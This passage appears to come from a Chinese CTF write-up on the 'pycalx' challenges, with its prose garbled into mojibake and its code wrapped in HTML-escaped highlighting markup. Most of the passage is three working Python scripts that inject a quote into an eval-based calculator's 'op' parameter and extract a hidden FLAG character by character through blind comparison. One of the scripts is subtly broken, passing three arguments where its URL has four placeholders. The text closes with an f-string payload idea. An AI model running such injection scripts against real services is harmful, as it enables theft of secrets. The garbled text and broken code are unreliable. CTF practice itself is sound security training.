&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;&amp;gt;&amp;gt;&amp;gt; print(&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">escape&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">calc_eval&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">calc_eval&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">isdigit&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;True&amp;#39;&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;False&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Invalid&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># Sorry we don&amp;#39;t support output as a string due to security issue.&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Invalid&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;&amp;gt;&amp;gt; &amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ˜¯å®žçŽ°äº†ä¸€ä¸ªè®¡ç®—å™¨ï¼ˆé™¤äº†æ•°å­—è¿˜å¯ä»¥è¿ç®—å­—ç¬¦ä¸²ï¼‰ï¼Œä½†æ˜¯å¯¹å‚æ•°çš„è¿‡æ»¤ä¸Šå¹¶ä¸ä¸¥è°¨&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211173753491.png" alt="image-20211211173753491">&lt;/p>
&lt;p>å¿˜äº†ä½¿ç”¨&lt;code>get_value&lt;/code>å‡½æ•°äº†ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ç”¨é»‘åå•é‡Œé¢çš„è¿ç®—ç¬¦çš„ï¼Œç”¨ç±»ä¼¼char-by-char-sqliçš„æ–¹å¼ç›²æ³¨å‡ºflagï¼ˆå› ä¸ºæ²¡æœ‰å›žæ˜¾ï¼‰ï¼Œæˆ‘ä»¬å¯æŽ§çš„å˜é‡æ˜¯sourceï¼ˆä½œç”¨åŸŸæ˜¯å…¨å±€ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://eabb9a29-a56e-461e-a0a8-7953b6c243c5.node4.buuoj.cn:81/cgi-bin/pycalx.py?source=&lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;amp;value1=&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">&amp;amp;op=&lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">&amp;amp;value2=&lt;/span>&lt;span style="color:#d88200">{3}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;WQERGFD&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">op&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;+&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; and FLAG&amp;gt;source#&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">prev&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">printable&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">prev&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#75715e">#print(result)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;False&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#34;security&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">prev&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">prev&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">i&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çœ‹ç€è·Ÿsqliå¾ˆåƒï¼Œæ˜¯å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œpythoné»˜è®¤æ¯”å®Œç¬¬ä¸€ä½æ¯”ç¬¬äºŒä½ï¼Œæ‰€ä»¥ä¸éœ€è¦sqlié‚£æ ·æŒ‡åç¬¬å‡ ä½é‚£æ ·ï¼Œæ³¨å…¥å¯ä»¥æ™®é€šfor&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">requests.api&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">get&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">requests.utils&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">quote&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://eabb9a29-a56e-461e-a0a8-7953b6c243c5.node4.buuoj.cn:81/cgi-bin/pycalx.py?source=&lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;amp;value1=&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">&amp;amp;op=&lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">&amp;amp;value2=&lt;/span>&lt;span style="color:#d88200">{3}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">source&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">value1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;WQERGFD&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">op&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;+&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">value2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39; and FLAG&amp;gt;source#&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">prev&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">45&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">printable&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">source&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">prev&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">source&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;False&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#39;security&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">prev&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">prev&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">i&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹Ÿå¯ä»¥äºŒåˆ†ï¼ˆæ„Ÿè§‰è‡ªå·±ä¹‹å‰å†™çš„äºŒåˆ†æ³•çš„è„šæœ¬åº”è¯¥è§£è€¦äº†ï¼Œä¸ç„¶é‡åˆ°è¿™ç§æƒ…å†µçš„è¯éœ€è¦æ”¹çš„åœ°æ–¹å°±å¤ªå¤šäº†ï¼Œåº”è¯¥æ”¹æˆä¸€äº›å‡½æ•°çš„é›†åˆä½“ å°±åƒè¿™ä¸ªå¤§ä½¬çš„ä¸€æ ·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">re&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">calc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">v1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">v2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">u&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://178.128.96.203/cgi-bin/server.py?&amp;#34;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">v1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">v2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">op&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">source&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># print payload&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># print r.url&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">re&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">findall&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;gt;&amp;gt;&amp;gt;&amp;gt;([\s\S]*)&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;gt;&amp;gt;&amp;gt; &amp;lt;\/pre&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Invalid&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;True&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># print r.content&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">calc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">v1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">v2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">bin_search&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">seq&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">xrange&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0x20&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0x80&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">lo&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">hi&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lo&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">hi&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">hi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">seq&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">lo&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">hi&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">mid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lo&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">hi&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;span style="color:#75715e"># print lo, mid, hi, &amp;#34;\t&amp;#34;,&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">check&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">seq&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">]):&lt;/span> &lt;span style="color:#111">hi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">lo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">seq&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">lo&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">v1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">v2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;x&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;+FLAG&amp;lt;value1+source#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;+&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">bin_search&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">flag&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€”â€”â€”â€”â€”â€”â€”â€”ä¸‹é¢æ˜¯pycalx2&lt;/p>
&lt;p>æŠŠä¸Šé¢çš„opé‚£é‡Œä¹ŸåŠ äº†&lt;code>get_value&lt;/code>å‡½æ•°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211173952684.png" alt="image-20211211173952684">&lt;/p>
&lt;p>ä¸èƒ½ç”¨å•å¼•å·äº†ï¼Œè¿™é‡Œè€ƒçš„åœ°æ–¹æ˜¯&lt;code>f-string&lt;/code>çš„ç‰¹æ€§ï¼Œå¯ä»¥ç›´æŽ¥æ’å…¥è¿ç®—è¡¨è¾¾å¼ï¼Œä¸è¿‡è¦æ”¹ä¸€ä¸‹è„šæœ¬çš„æ€è·¯&lt;/p>
&lt;pre tabindex="0">&lt;code>f&amp;quot;{Flag&amp;gt;source or 'e'}&amp;quot;
&lt;/code>&lt;/pre>&lt;p>å¦‚æžœæˆåŠŸè¾“å‡º1ï¼Œä¸æˆåŠŸè¾“å‡ºeï¼Œæ‹¼æŽ¥ä¸Šå‰é¢çš„Truï¼ŒæˆåŠŸä¸ºTru1ï¼Œä¸æˆåŠŸä¸ºTrue&lt;/p>
